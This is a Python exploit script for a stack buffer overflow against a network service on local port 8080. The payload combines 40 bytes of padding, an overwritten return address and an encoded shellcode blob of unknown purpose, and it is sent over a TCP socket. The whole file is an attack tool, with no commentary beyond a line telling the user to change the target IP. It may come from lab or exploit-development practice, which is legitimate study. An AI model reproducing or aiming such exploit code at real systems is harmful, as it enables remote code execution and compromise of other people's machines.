import socket

def create_payload():
	#payload = ""
	junk = b"A"*40

	eip = b"\x40\xfd\xff\x05" #0x5ffd40

	buf =  b""
	buf += b"\xda\xd8\xba\xb2\x7e\x9e\xb8\xd9\x74\x24\xf4\x5e\x29"
	buf += b"\xc9\xb1\x31\x31\x56\x18\x03\x56\x18\x83\xc6\xb6\x9c"
	buf += b"\x6b\x44\x5e\xe2\x94\xb5\x9e\x83\x1d\x50\xaf\x83\x7a"
	buf += b"\x10\x9f\x33\x08\x74\x13\xbf\x5c\x6d\xa0\xcd\x48\x82"
	buf += b"\x01\x7b\xaf\xad\x92\xd0\x93\xac\x10\x2b\xc0\x0e\x29"
	buf += b"\xe4\x15\x4e\x6e\x19\xd7\x02\x27\x55\x4a\xb3\x4c\x23"
	buf += b"\x57\x38\x1e\xa5\xdf\xdd\xd6\xc4\xce\x73\x6d\x9f\xd0"
	buf += b"\x72\xa2\xab\x58\x6d\xa7\x96\x13\x06\x13\x6c\xa2\xce"
	buf += b"\x6a\x8d\x09\x2f\x43\x7c\x53\x77\x63\x9f\x26\x81\x90"
	buf += b"\x22\x31\x56\xeb\xf8\xb4\x4d\x4b\x8a\x6f\xaa\x6a\x5f"
	buf += b"\xe9\x39\x60\x14\x7d\x65\x64\xab\x52\x1d\x90\x20\x55"
	buf += b"\xf2\x11\x72\x72\xd6\x7a\x20\x1b\x4f\x26\x87\x24\x8f"
	buf += b"\x89\x78\x81\xdb\x27\x6c\xb8\x81\x2d\x73\x4e\xbc\x03"
	buf += b"\x73\x50\xbf\x33\x1c\x61\x34\xdc\x5b\x7e\x9f\x99\x94"
	buf += b"\x34\x82\x8b\x3c\x91\x56\x8e\x20\x22\x8d\xcc\x5c\xa1"
	buf += b"\x24\xac\x9a\xb9\x4c\xa9\xe7\x7d\xbc\xc3\x78\xe8\xc2"
	buf += b"\x70\x78\x39\xa1\x17\xea\xa1\x08\xb2\x8a\x40\x55"



	payload = junk + eip + buf

	return payload




def main():
	host = '127.0.0.1'  # Change this to your server's IP address
	port = 8080

	client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	client_socket.connect((host, port))

	payload = create_payload()
	client_socket.send(payload)

	data = client_socket.recv(1024)
	print("Server response:", data.decode())

	client_socket.close()

if __name__ == '__main__':
	main()
